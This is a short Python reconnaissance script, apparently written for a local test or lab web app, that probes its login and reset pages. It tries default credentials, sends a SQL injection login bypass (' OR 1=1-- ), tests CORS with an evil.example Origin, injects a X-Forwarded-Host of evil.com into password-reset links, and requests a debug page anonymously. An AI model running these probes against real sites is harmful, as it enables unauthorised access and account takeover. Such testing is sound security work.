#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""recon-02: 抓原始登录响应，确认 Set-Cookie / Location / 页面内容。"""
import sys, urllib.request, urllib.error, urllib.parse, re

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
A = "http://127.0.0.1:8095"


def raw_req(path, method="GET", body=None, cookie=None, headers=None):
    r = urllib.request.Request(A + path, method=method)
    for k, v in (headers or {}).items():
        r.add_header(k, v)
    if cookie:
        r.add_header("Cookie", cookie)
    data = None
    if body is not None:
        data = body.encode()
        r.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(r, data=data, timeout=12) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def show(tag, st, hdr, raw):
    print("-" * 90)
    print(f"### {tag}  -> HTTP {st}")
    print("  headers:")
    for k in ("Server", "Location", "Set-Cookie", "Content-Type", "Content-Length",
              "X-Frame-Options", "Content-Security-Policy", "Access-Control-Allow-Origin"):
        if k in hdr:
            print(f"    {k}: {hdr[k]}")
    txt = raw.decode("utf-8", "replace")
    body = re.sub(r"<style.*?</style>", "", txt, flags=re.S)
    body = re.sub(r"\s+", " ", body)
    print("  body:", body[:700])


print("=" * 90)
print("1) GET / （首页，看测试账号提示 = 版本指纹）")
st, hdr, raw = raw_req("/")
show("GET /", st, hdr, raw)

print()
print("=" * 90)
print("2) POST /login admin/admin123")
st, hdr, raw = raw_req("/login", "POST", "username=admin&password=admin123")
show("POST /login admin/admin123", st, hdr, raw)

print()
print("=" * 90)
print("3) POST /login demo/demo123")
st, hdr, raw = raw_req("/login", "POST", "username=demo&password=demo123")
show("POST /login demo/demo123", st, hdr, raw)

print()
print("=" * 90)
print("4) POST /login SQLi  ' OR 1=1-- (只读探测：看是否绕过)")
st, hdr, raw = raw_req("/login", "POST",
                       "username=" + urllib.parse.quote("' OR 1=1-- ") + "&password=x")
show("POST /login SQLi", st, hdr, raw)

print()
print("=" * 90)
print("5) 带 Origin 探测 CORS")
st, hdr, raw = raw_req("/", headers={"Origin": "http://evil.example"})
print(f"  status={st} ACAO={hdr.get('Access-Control-Allow-Origin')} "
      f"ACAC={hdr.get('Access-Control-Allow-Credentials')}")

print()
print("=" * 90)
print("6) /forgot Host 头注入探测")
st, hdr, raw = raw_req("/forgot?username=admin", headers={"X-Forwarded-Host": "evil.com"})
txt = raw.decode("utf-8", "replace")
m = re.search(r"http://[^<\s]+", txt)
print(f"  status={st} 生成链接={m.group(0) if m else '未找到'}")

print()
print("=" * 90)
print("7) /debug 未登录")
st, hdr, raw = raw_req("/debug")
show("GET /debug (anon)", st, hdr, raw)
